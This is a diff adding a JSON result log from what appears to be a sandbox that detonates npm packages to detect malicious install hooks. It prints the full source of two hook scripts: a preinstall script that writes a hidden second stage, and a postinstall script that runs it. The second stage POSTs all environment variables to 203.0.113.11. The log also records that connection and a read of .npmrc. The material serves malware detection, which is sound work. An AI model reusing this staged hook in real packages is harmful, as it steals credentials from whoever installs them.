@@ -1,0 +1,129 @@
+{
+ "job_id": "b71272f8-83e6-4899-9a79-e50519694abf",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 6.06,
+ "exec_events": [
+  {
+   "ts": "2026-11-03T22:30:11.228389436Z",
+   "pid": 285921,
+   "ppid": 285898,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-cf98c4739b6d44cf; \"$@\"; rc=$?; /bin/true post-cf98c4739b6d44cf; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/bc01-staged-hooks",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:11.234742948Z",
+   "pid": 285961,
+   "ppid": 285921,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc01-staged-hooks",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:11.235679387Z",
+   "pid": 285961,
+   "ppid": 285961,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc01-staged-hooks",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:11.691413655Z",
+   "pid": 285981,
+   "ppid": 285961,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/stage.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc01-staged-hooks"
+  },
+  {
+   "ts": "2026-11-03T22:30:11.692666539Z",
+   "pid": 285982,
+   "ppid": 285981,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/stage.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc01-staged-hooks"
+  },
+  {
+   "ts": "2026-11-03T22:30:11.732289722Z",
+   "pid": 285989,
+   "ppid": 285961,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/run.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc01-staged-hooks"
+  },
+  {
+   "ts": "2026-11-03T22:30:11.733195315Z",
+   "pid": 285990,
+   "ppid": 285989,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/run.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc01-staged-hooks"
+  }
+ ],
+ "connect_events": [
+  {
+   "ts": "2026-11-03T22:30:11.813876322Z",
+   "pid": 285990,
+   "binary": "/usr/local/bin/node",
+   "daddr": "203.0.113.11",
+   "dport": 443,
+   "family": "AF_INET",
+   "resolved_domain": null,
+   "protocol": "tcp"
+  }
+ ],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-03T22:30:11.350955520Z",
+   "pid": 285961,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/bc01-staged-hooks/scripts/run.js",
+   "package": null,
+   "sha256": "01c7069373d00c8d921aa9bad35fa84e0bb9665a8f33a60449d30e6c182def6f",
+   "content": "const path = require(\"path\");\n// Execute whatever preinstall dropped next to us.\ntry { require(path.join(__dirname, \"stage2.js\")); } catch {}\n",
+   "truncated": false
+  },
+  {
+   "path": "/work/payloads/bc01-staged-hooks/scripts/stage.js",
+   "package": null,
+   "sha256": "62a8a9d7197b7d11181b0473c707dfa1c9b42b249f9f1be01e65ba7d1a0f7399",
+   "content": "const fs = require(\"fs\"), path = require(\"path\");\n// Write the real payload at install time; it is absent from the reviewed diff.\nconst stage2 = [\n  'const https = require(\"https\");',\n  'const r = https.request({ host: \"203.0.113.11\", method: \"POST\", path: \"/i\", timeout: 3000 });',\n  'r.on(\"error\", () => {}); r.on(\"timeout\", () => r.destroy());',\n  'r.end(JSON.stringify(process.env));',\n].join(\"\\n\");\ntry { fs.writeFileSync(path.join(__dirname, \"stage2.js\"), stage2); } catch {}\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> bc01@1.0.0 preinstall\n> node scripts/stage.js\n\n\n> bc01@1.0.0 postinstall\n> node scripts/run.js\n\n\nup to date in 3s\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.72,
+  "peak_memory_mb": 40.0,
+  "samples": 8
+ }
+}
